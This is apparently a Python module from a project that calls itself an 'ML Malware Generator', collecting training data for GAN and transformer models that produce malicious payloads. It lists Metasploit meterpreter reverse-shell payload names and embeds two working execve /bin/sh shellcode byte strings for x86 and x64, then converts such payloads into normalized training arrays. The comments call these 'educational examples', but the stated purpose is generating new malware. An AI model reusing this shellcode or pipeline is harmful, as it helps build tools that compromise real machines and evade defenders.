"""
ML Malware Generator - Data Collection System
Collects and preprocesses training data from public sources
"""
import requests
import hashlib
import json
from pathlib import Path
from typing import List, Dict, Optional
import time

from config.settings import data_config, DATA_DIR
from utils.logger import get_logger

logger = get_logger()


class DataCollector:
    """Collect training data from public sources"""
    
    def __init__(self):
        self.data_dir = DATA_DIR
        self.malware_dir = data_config.malware_dataset_dir
        self.shellcode_dir = data_config.shellcode_dataset_dir
        self.benign_dir = data_config.benign_dataset_dir
        
        # Create directories
        for directory in [self.malware_dir, self.shellcode_dir, self.benign_dir]:
            directory.mkdir(parents=True, exist_ok=True)
    
    def collect_metasploit_payloads(self) -> List[Dict]:
        """
        Collect payload examples from Metasploit Framework
        (Uses publicly available payload templates)
        """
        logger.info("Collecting Metasploit payload templates...")
        
        payloads = []
        
        # Common Metasploit payload patterns (educational examples)
        payload_templates = [
            {
                "name": "windows/meterpreter/reverse_tcp",
                "platform": "windows",
                "arch": "x86",
                "type": "reverse_shell",
            },
            {
                "name": "windows/x64/meterpreter/reverse_tcp",
                "platform": "windows",
                "arch": "x64",
                "type": "reverse_shell",
            },
            {
                "name": "linux/x86/meterpreter/reverse_tcp",
                "platform": "linux",
                "arch": "x86",
                "type": "reverse_shell",
            },
            {
                "name": "linux/x64/meterpreter/reverse_tcp",
                "platform": "linux",
                "arch": "x64",
                "type": "reverse_shell",
            },
        ]
        
        for template in payload_templates:
            payloads.append(template)
        
        logger.success(f"Collected {len(payloads)} Metasploit payload templates")
        return payloads
    
    def collect_shellcode_samples(self) -> List[Dict]:
        """
        Collect shellcode samples from public sources
        (Educational examples only)
        """
        logger.info("Collecting shellcode samples...")
        
        shellcode_samples = []
        
        # Example shellcode patterns (simplified for training)
        examples = [
            {
                "name": "x86_execve_bin_sh",
                "arch": "x86",
                "description": "Execute /bin/sh",
                "shellcode": "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80",
            },
            {
                "name": "x64_execve_bin_sh",
                "arch": "x64",
                "description": "Execute /bin/sh (x64)",
                "shellcode": "\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05",
            },
        ]
        
        for example in examples:
            shellcode_samples.append(example)
        
        logger.success(f"Collected {len(shellcode_samples)} shellcode samples")
        return shellcode_samples
    
    def save_dataset(self, data: List[Dict], dataset_name: str):
        """Save collected dataset to disk"""
        output_path = self.data_dir / f"{dataset_name}.json"
        
        with open(output_path, 'w') as f:
            json.dump(data, f, indent=2)
        
        logger.info(f"Saved dataset to {output_path}")
    
    def load_dataset(self, dataset_name: str) -> List[Dict]:
        """Load dataset from disk"""
        dataset_path = self.data_dir / f"{dataset_name}.json"
        
        if not dataset_path.exists():
            logger.warning(f"Dataset {dataset_name} not found")
            return []
        
        with open(dataset_path, 'r') as f:
            data = json.load(f)
        
        logger.info(f"Loaded {len(data)} samples from {dataset_name}")
        return data
    
    def collect_all_datasets(self):
        """Collect all available datasets"""
        logger.info("Collecting all datasets...")
        
        # Collect Metasploit payloads
        metasploit_data = self.collect_metasploit_payloads()
        self.save_dataset(metasploit_data, "metasploit_payloads")
        
        # Collect shellcode samples
        shellcode_data = self.collect_shellcode_samples()
        self.save_dataset(shellcode_data, "shellcode_samples")
        
        logger.success("All datasets collected successfully")


class DataPreprocessor:
    """Preprocess collected data for ML training"""
    
    def __init__(self):
        self.data_dir = DATA_DIR
    
    def extract_features(self, payload_bytes: bytes) -> Dict:
        """
        Extract features from payload for ML training
        
        Returns:
            Dictionary of extracted features
        """
        import numpy as np
        from collections import Counter
        
        features = {}
        
        # Basic features
        features['size'] = len(payload_bytes)
        features['entropy'] = self._calculate_entropy(payload_bytes)
        
        # Byte frequency distribution
        byte_freq = Counter(payload_bytes)
        features['byte_distribution'] = dict(byte_freq.most_common(10))
        
        # N-gram features (2-grams)
        ngrams = [payload_bytes[i:i+2] for i in range(len(payload_bytes)-1)]
        ngram_freq = Counter(ngrams)
        features['top_ngrams'] = [ng.hex() for ng, _ in ngram_freq.most_common(10)]
        
        # Opcode distribution (simplified)
        features['opcode_diversity'] = len(set(payload_bytes))
        
        # String features
        features['printable_ratio'] = sum(32 <= b < 127 for b in payload_bytes) / len(payload_bytes)
        
        return features
    
    def _calculate_entropy(self, data: bytes) -> float:
        """Calculate Shannon entropy"""
        if not data:
            return 0.0
        
        import math
        from collections import Counter
        
        byte_counts = Counter(data)
        data_len = len(data)
        
        entropy = 0.0
        for count in byte_counts.values():
            probability = count / data_len
            entropy -= probability * math.log2(probability)
        
        return entropy
    
    def tokenize_shellcode(self, shellcode: str) -> List[str]:
        """
        Tokenize shellcode for transformer training
        
        Args:
            shellcode: Assembly code string
        
        Returns:
            List of tokens
        """
        # Simple tokenization (split by whitespace and special chars)
        import re
        
        # Remove comments
        shellcode = re.sub(r';.*$', '', shellcode, flags=re.MULTILINE)
        
        # Tokenize
        tokens = re.findall(r'\w+|[,\[\]\+\-\*]', shellcode)
        
        return tokens
    
    def prepare_gan_training_data(
        self,
        payload_samples: List[bytes],
        feature_dim: int = 512,
    ) -> 'np.ndarray':
        """
        Prepare data for GAN training
        
        Args:
            payload_samples: List of payload bytes
            feature_dim: Dimension of feature vectors
        
        Returns:
            NumPy array of shape (num_samples, feature_dim)
        """
        import numpy as np
        
        logger.info(f"Preparing GAN training data ({len(payload_samples)} samples)...")
        
        training_data = []
        
        for payload in payload_samples:
            # Convert to feature vector
            features = np.frombuffer(payload, dtype=np.uint8).astype(np.float32)
            
            # Normalize to [-1, 1]
            features = (features / 127.5) - 1.0
            
            # Pad or truncate to feature_dim
            if len(features) < feature_dim:
                features = np.pad(features, (0, feature_dim - len(features)))
            else:
                features = features[:feature_dim]
            
            training_data.append(features)
        
        training_data = np.array(training_data)
        
        logger.success(f"Prepared training data: shape {training_data.shape}")
        return training_data
    
    def prepare_transformer_training_data(
        self,
        shellcode_samples: List[str],
    ) -> List[str]:
        """
        Prepare shellcode data for transformer training
        
        Args:
            shellcode_samples: List of shellcode strings
        
        Returns:
            List of preprocessed shellcode strings
        """
        logger.info(f"Preparing transformer training data ({len(shellcode_samples)} samples)...")
        
        preprocessed = []
        
        for shellcode in shellcode_samples:
            # Clean and normalize
            cleaned = shellcode.strip()
            
            # Add to training data
            if cleaned:
                preprocessed.append(cleaned)
        
        logger.success(f"Prepared {len(preprocessed)} shellcode samples")
        return preprocessed


# Global instances
_data_collector = None
_data_preprocessor = None


def get_data_collector() -> DataCollector:
    """Get global data collector instance"""
    global _data_collector
    if _data_collector is None:
        _data_collector = DataCollector()
    return _data_collector


def get_data_preprocessor() -> DataPreprocessor:
    """Get global data preprocessor instance"""
    global _data_preprocessor
    if _data_preprocessor is None:
        _data_preprocessor = DataPreprocessor()
    return _data_preprocessor
